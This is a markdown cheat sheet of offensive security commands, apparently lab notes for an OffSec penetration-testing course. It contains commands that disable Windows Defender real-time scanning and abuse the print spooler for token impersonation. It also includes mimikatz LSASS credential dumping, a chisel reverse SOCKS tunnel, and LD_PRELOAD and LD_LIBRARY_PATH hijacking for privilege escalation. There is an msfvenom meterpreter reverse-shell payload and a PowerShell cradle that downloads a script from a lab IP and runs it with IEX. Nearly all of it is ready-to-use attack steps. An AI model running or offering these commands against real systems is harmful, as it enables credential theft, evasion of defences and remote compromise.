# Go Buster
```bash
gobuster dir -e -u http://192.168.120.132/ -w /usr/share/wordlists/dirb/common.txt
```

# Windows AV

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRemovableDriveScanning $true
Set-MpPreference -DisableArchiveScanning $true
Get-MpComputerStatus
```

# Windows Credential

## SpoolSV Exploitation
```powershell
ls \\dc03\pipe\spoolss

SpoolSample.exe [Host Machine] [Target Pipe] <appsrv01\test>
PrintSpooferNet.exe [Target Pipe] <\\.\pipe\test\pipe\spoolss>
```
## Incognito Impersonation Metasploit
```powershell
#Inside Metasploit 
load incognito
list_tokens -u
impersonate_token corp1\\admin
getuid
```
## MiniDump
```powershell
#MiniDump.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
# Network 

## Chisel Tunnel
```Powershell
#Server Side
./chisel server -p [Port] --reverse

#Client Side
./chisel client [Server IP Address]:[Port] R:[Remote Port]:socks

#Server Side
proxychains4 nmap [IP Address]
```
# Linux Command Injection 

## LD_LIBRARY_PATH Hijacking
Logic: Use LDD to find libgpg-error.so.0 → Use readelf to grep needed variable → Put into "Linux Shellcode Loaders/sharedLibrary_LD_LIBRARY_PATH.c" → Export the library path and Execute
```bash
ldd /usr/bin/top //Find out libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl
export LD_LIBRARY_PATH=/home/offsec/ldlib/
sudo top
```

## LD_PRELOAD
Logic: Use ltrace cp → find out the cp command use getuid → set LD_PRELOAD to hijack the function
```bash
gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl
export LD_PRELOAD=/home/offsec/evil_geteuid.so
```

# MSF Console

## Payload Generation
```bash
#For linux XOR
sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf

```

## Post-exploitation
```powershell
execute -H -f notepad
migrate

##Download Host Recon
(new-object system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX

## Check RunasPPL (If 1 -> Enabled)
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```
